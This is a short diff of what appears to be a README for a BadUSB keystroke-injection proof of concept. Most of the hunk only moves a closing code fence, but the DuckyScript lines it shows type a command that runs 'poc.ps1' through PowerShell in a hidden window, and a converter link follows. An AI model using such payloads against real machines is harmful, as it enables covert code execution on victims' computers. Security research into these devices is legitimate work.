@@ -56,7 +56,8 @@ ENTER
 DELAY 500
 STRING powershell.exe -windowstyle hidden -file poc.ps1
 DELAY 500
-ENTER```
+ENTER
+```
 
 > Link to convert to .ino: https://malduino.com/converter/
 
